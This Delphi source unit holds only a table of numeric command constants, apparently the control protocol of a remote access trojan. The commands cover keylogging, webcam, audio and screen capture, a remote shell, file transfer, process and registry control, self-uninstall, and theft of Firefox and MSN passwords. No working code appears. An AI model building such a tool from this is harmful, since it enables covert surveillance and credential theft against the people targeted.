unit untCMDList;

interface

Const
  C_PASS                = 60;
  C_VERSION             = 02;
  C_CONNECTION          = 03;
  C_PING                = 04;

  C_PUTFILE             = 40;
  C_GETFILE             = 25;
  C_STARTTRANSFER       = 26;
  C_AUTH                = 61;

  C_INFOSYSTEM          = 08;
  C_INFOSERVER          = 09;
  C_INFONETWORK         = 10;
  C_REQUESTLIST         = 11;
  C_REQUESTDRIVE        = 12;
  C_CURRENTPATH         = 13;
  C_EXECUTE             = 14;
  C_DELETE              = 15;
  C_PROCESSLIST         = 16;
  C_MODULELIST          = 17;
  C_ENDPROCESS          = 18;
  C_REMOTECMD           = 19;
  C_ASSIGNEDNAME        = 20;
  C_UNINSTALL           = 21;
  C_DOWNLOAD            = 22;
  C_FINISH              = 23;
  C_SCREEN              = 24;
  C_SCREENN             = 50;
  C_WEBCAM              = 29;
  C_STARTKEYLOG         = 30;
  C_STOPKEYLOG          = 31;
  C_STOPSERV            = 33;
  C_UNINSTALLSERV       = 34;
  C_LISTREGKEY          = 35;
  C_GETOFFKEYLOG        = 42;
  C_GETFFPASSW          = 43;
  C_GETMSNPASSW         = 44;
  C_STOPWEBCAM          = 48;
  C_DELETEREGKEY        = 58;
  C_PLUGINCONN          = 88;
  C_RESTART             = 94;
  C_LISTSERVICES        = 77;
  C_LISTWINDOWS         = 95;
  C_CLOSEWIN            = 110;
  C_MAXWIN              = 111;
  C_MINWIN              = 112;
  C_STARTSERVICE        = 113;
  C_STOPSERVICE         = 114;
  C_GETSYMETRIC         = 115;
  C_GETTHUMB            = 116;
  C_LEFTCLICK           = 120;
  C_RIGHTCLICK          = 121;
  C_SHELLACTIVE         = 200;
  C_SHELLEXECUT         = 201;
  C_SHELLCLOSE          = 202;
  C_INFORMATION         = 300;
  C_WINDOW              = 304;


  C_AUDIOSTART         = 400; // Start Audio Capture
  C_AUDIOSTOP          = 401; // Stop Audio Capture
  C_THUMBDESKTOP       = 402; // Thumbnail Desktop Capture

  
implementation

end.
